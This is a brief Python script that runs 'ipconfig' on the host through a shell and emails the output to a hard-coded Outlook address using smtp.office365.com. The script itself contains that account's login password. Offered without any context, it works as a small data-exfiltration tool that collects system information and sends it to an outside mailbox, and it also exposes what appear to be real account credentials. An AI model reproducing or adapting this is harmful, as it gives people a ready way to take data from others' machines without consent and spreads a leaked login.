#!/usr/bin/env python

import subprocess # Used to execute terminal commands
import smtplib # Allows sending email

def send_email(email, password, message):
    server = smtplib.SMTP("smtp.office365.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


if __name__ == "__main__":
    command = "ipconfig"
    result = subprocess.check_output(command, shell=True)
    send_email("brlt5@outlook.com", "3hQ8#9XTCNq$TWzPtR!c", result)